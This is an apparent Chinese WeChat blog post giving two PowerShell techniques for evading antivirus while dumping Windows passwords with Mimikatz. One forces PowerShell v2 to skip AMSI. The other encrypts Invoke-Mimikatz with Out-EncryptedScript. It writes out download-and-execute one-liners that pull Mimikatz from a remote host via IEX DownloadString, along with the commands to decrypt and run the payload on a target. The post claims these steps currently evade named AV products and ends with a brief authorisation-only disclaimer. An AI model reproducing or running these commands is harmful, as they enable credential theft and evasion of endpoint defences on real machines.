##  powershell免杀抓密码姿势

原创 tubai  [ 花指令安全实验室 ](javascript:void\(0\);)

**花指令安全实验室** ![]()

微信号 junk-code

功能介绍 专注于红蓝安全攻防研究的优质平台

____

__

收录于话题

  
前言：  
今天给大家分享两个利用powershell来bypass杀软抓密码技巧，亲测目前不杀。  
注：本号首发在了土司 https://www.t00ls.net/thread-62167-1-1.html  
一.

  

利用powershell v2绕过amsi抓windows密码（前提是win10机器需要.net3.0以上）

当我们实用原始的powershell执行经典的抓密码发现，是被amsi阻止的  

  * 

    
    
    powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.52.134:6688/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110810.png)  

  

此时我们利用降维攻击，强制使用PowerShell v2绕过 amsi，因为版本2没有支持AMSI的必要内部挂钩  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110812.png)  

  

可以看到成功绕过了amsi的检测执行成功mimikatz抓到了密码！

二.

使用Out-EncryptedScript加密免杀抓取密码（亲测目前可绕过某绒和某60）

Out-EncryptedScript是Powersploit中提供工具的一种，他是用来进行加密处理的脚本，首先我们将Out-
EncryptedScript.ps1与Invoke-Mimikatz.ps1放到同一目录下  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110813.png)

  

依次执行如下命令  

  *   *   * 

    
    
    powershell.exeImport-Module .\Out-EncryptedScript.ps1Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password tubai -Salt 123456

  
  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110814.png)  

  

目录下便会自动生成evil.ps1文件，上传到目标机器即可  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110813.png)  

  

在目标机器依次执行如下命令  

  *   *   *   *   *   *   * 

    
    
    powershell.exeIEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Out-EncryptedScript.ps1")  注：由于https://raw.githubusercontent.com/不稳地，我本人是放在自己的阿里云上的。[String] $cmd = Get-Content .\evil.ps1Invoke-Expression $cmd$decrypted = de tubai 123456Invoke-Expression $decryptedInvoke-Mimikatz

  
  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110815.png)  

如下，便成功绕过了杀软，成功的抓到了密码  

![](https://gitee.com/fuli009/images/raw/master/public/20210805110816.png)  

  

三

  

总结：

绕过AV的方式层出不穷，powershell在内网渗透方面利用的方式非常多，远远不止免杀与信息收集，希望大家能在授权的情况下，玩转自己的绕过思路，都能总结出自己的一些bypass小技巧！  

声明:文章初衷仅为攻防研究学习交流之用，严禁利用相关技术去从事一切未经合法授权的入侵攻击破坏活动，因此所产生的一切不良后果与本文作者及该公众号无关

若各位师傅有更多姿势，或想与我一起交流学习，可加我VX：  

‍‍‍![](https://gitee.com/fuli009/images/raw/master/public/20210805110818.png)  

分享收藏点赞在看

  

  
  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

powershell免杀抓密码姿势

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

